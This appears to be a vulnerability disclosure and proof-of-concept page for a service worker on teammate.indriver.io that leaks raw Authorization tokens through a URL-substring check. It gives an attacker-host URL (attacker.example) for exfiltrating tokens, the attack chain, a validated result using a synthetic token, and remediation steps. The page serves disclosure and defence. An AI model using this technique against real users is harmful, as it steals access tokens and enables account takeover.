teammate.indriver.io
Service Worker token exfiltration

The site's service worker attaches the raw Authorization token to any image request whose URL contains the string https://teammate.indriver.io. A cross-origin URL such as https://attacker.example/?https://teammate.indriver.io matches the substring check. This page is a live harness for the validated gadget; the test uses a unique synthetic token and never reads or transmits a real user token.

asset: teammate.indriver.io CWE-522 · insufficiently protected credentials live service worker: active live test: token captured

Run the live PoC

The target is a different origin, so a normal web page cannot access its service worker or cache. The payload below is designed to be pasted into the DevTools console on https://teammate.indriver.io/ while signed in with a test account.

Do not use a real user account. The script replaces the service worker's in-memory token with a synthetic value until the page is reloaded. It never reads localStorage and never sends a real token.

Payload


      

        The real exploit does not need console access. The app itself calls
        postMessage({type:"SET_TOKEN", accessToken: <real token>}) after login/refresh.
        The attacker only needs the victim to render an image URL whose string contains the target origin.
      

    


    

      
What was validated

      

        
Service worker
/sw.js · scope / · active + controller

        
Route condition
destination === "image" && href.includes("https://teammate.indriver.io")

        
Header
Authorization: <raw access token>

cors (attacker server must allow Authorization)

        
Cache
image-cache

        
Test value
TESTTOKEN-<timestamp> (synthetic)

      


      
Live result

      

        A synthetic token was posted to the live service worker, an image was requested from
        https://httpbin.org/headers?u=https://teammate.indriver.io, and the
        cached JSON contained:
      

      
{
  "headers": {
    "Authorization": "TESTTOKEN-1795641656031",
    "Origin": "https://teammate.indriver.io",
    "Sec-Fetch-Mode": "cors"
  }
}

      

        Control: the same request without the substring was not matched and was not cached by the route.
      


      
Impact

      

        Any authenticated user who views attacker-controlled content can leak the raw access token to an
        attacker-controlled origin. The attacker can then use that token against the application API,
        gaining the victim's account context (potentially HR, salary, and admin data).
      

    

  


  

    
Why the substring check is exploitable

    

      
1. Attacker content
An idea/comment or image URL contains:
https://attacker.example/?https://teammate.indriver.io

      
→

      
2. Victim's browser
The page renders an <img>. The service worker sees an image request and matches the substring.

      
3. Service worker
Adds Authorization: <raw token> and sets mode:"cors".

      
→

      
4. Attacker server
Returns Access-Control-Allow-Headers: authorization; the GET carries the token and the attacker logs it.

    

    

      No script execution is required for the token leak: the raw HTML sink just needs to render an image element.
      A promising surface is the idea.description / comment text rendered with
      dangerouslySetInnerHTML; server-side sanitization still needs a test account to confirm.
    

  


  

    
Remediation

    
    
      
  • Check the request origin, not a URL substring: new URL(url).origin === self.location.origin.
    • 
      
  • Never attach an access token to cross-origin requests; use a same-origin image proxy or signed, short-lived URLs.
    • 
      
  • Restrict the service-worker route to same-origin image paths.
    • 
      
  • Sanitize user-rendered HTML server-side and client-side (DOMPurify) as defense in depth.
